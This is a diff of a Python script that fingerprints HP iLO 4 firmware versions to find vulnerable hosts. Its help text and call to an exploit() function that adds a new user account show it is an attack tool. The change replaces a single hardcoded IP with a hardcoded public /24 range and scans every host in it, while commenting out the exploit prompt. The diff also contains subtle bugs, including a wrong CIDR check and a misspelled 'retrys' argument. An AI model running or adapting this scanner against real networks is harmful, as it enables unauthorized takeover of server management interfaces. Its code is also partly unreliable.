@@ -11,7 +11,6 @@ searchmajorversion = []
 
 
 def majorversion(searchmajorversion):
-
     if not searchmajorversion:
         return False
     elif "(iLO 4)" in searchmajorversion[0]:
@@ -30,7 +29,6 @@ def minorversion(searchminorversion):
 
 
 def testxml(ip, port):
-
     page = 'https://%s/xmldata?item=all'
 
     if port == "443":
@@ -39,13 +37,15 @@ def testxml(ip, port):
         destination = ip + ':' + port
         url = page % destination
 
-    http = urllib3.PoolManager(cert_reqs='CERT_NONE')
-
-    req = http.request('GET', url)
-    req.release_conn()
-    content = (req.data.decode('utf-8'))
-    searchminorversion = re.findall(r'<FWRI>(.*?)</FWRI>', content)
-    searchmajorversion = re.findall(r'<PN>(.*?)</PN>', content)
+    try:
+        http = urllib3.PoolManager(cert_reqs='CERT_NONE', timeout=0.5, retries=0)
+        req = http.request('GET', url)
+        req.release_conn()
+        content = (req.data.decode('utf-8'))
+        searchminorversion = re.findall(r'<FWRI>(.*?)</FWRI>', content)
+        searchmajorversion = re.findall(r'<PN>(.*?)</PN>', content)
+    except Exception as e:
+        return
 
     try:
         if majorversion(searchmajorversion) and minorversion(searchminorversion):
@@ -111,10 +111,14 @@ def hometest(ip, port):
         destination = ip + ':' + port
         url = page % destination
 
-    headers = {'Accept': 'application/json'}
-    response = requests.get(url, headers, verify=False)
-    data = (response.content.decode('utf-8'))
-    minorver = re.findall(r'"version":"(.*?)"', data)
+    try:
+        headers = {'Accept': 'application/json'}
+        response = requests.get(url, headers, verify=False, timeout=1.0, retrys=0)
+        data = (response.content.decode('utf-8'))
+        minorver = re.findall(r'"version":"(.*?)"', data)
+    except Exception as e:
+        return
+
     if minorversion(minorver):
         return True
     else:
@@ -124,6 +128,7 @@ def hometest(ip, port):
 if __name__ == '__main__':
     import argparse
     import getpass
+    import ipaddress
 
     port = '9443'
 
@@ -133,30 +138,38 @@ if __name__ == '__main__':
     parser.add_argument('-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users')
     args = parser.parse_args()
 
-    args.ip = '81.137.196.185'
+    args.ip = '81.137.196.0/24'
+
+    if '//' in args.ip:
+        net4 = ipaddress.ip_network(args.ip)
+    else:
+        net4 = ipaddress.ip_address(args.ip)
 
     if args.p:
         port = args.p
 
     if args.t:
-        xmltester = testxml(args.ip, port)
-        hometester = hometest(args.ip, port)
-        if xmltester:
-            print('XML indicates target is vulnerable')
-            print('Would you like to exploit the Target!')
-            exploitilo = input('Type yes to exploit:  ')
-            if exploitilo == 'yes':
-                uname = input('New User:  ')
-                pwd = getpass.getpass(prompt='Password:  ')
-                print('Atempting Exploit')
-                res, ex = exploit(args.ip, port, uname, pwd)
-                if res:
-                    print('Exploit was successful')
+        if net4.hosts:
+            for i in net4.hosts():
+                print('Attempting %s' % i)
+                xmltester = testxml(i.exploded, port)
+                hometester = hometest(i.exploded, port)
+                if xmltester:
+                    print('XML indicates target %s is vulnerable' % i)
+                elif hometester:
+                    print('HomePage indicates target %s is vulnerable' % i)
                 else:
-                    print('[-] Error! %s' % ex)
-            else:
-                exit()
-        elif hometester:
-            print('HomePage indicates target is vulnerable')
-        else:
-            print('Target may not be vulnerable')
+                    print('Target %s may not be vulnerable' % i)
+#            print('Would you like to exploit the Target!')
+#            exploitilo = input('Type yes to exploit:  ')
+#            if exploitilo == 'yes':
+#                uname = input('New User:  ')
+#                pwd = getpass.getpass(prompt='Password:  ')
+#                print('Atempting Exploit')
+#                res, ex = exploit(i, port, uname, pwd)
+#                if res:
+#                    print('Exploit was successful')
+#                else:
+#                    print('[-] Error! %s' % ex)
+#            else:
+#                exit()
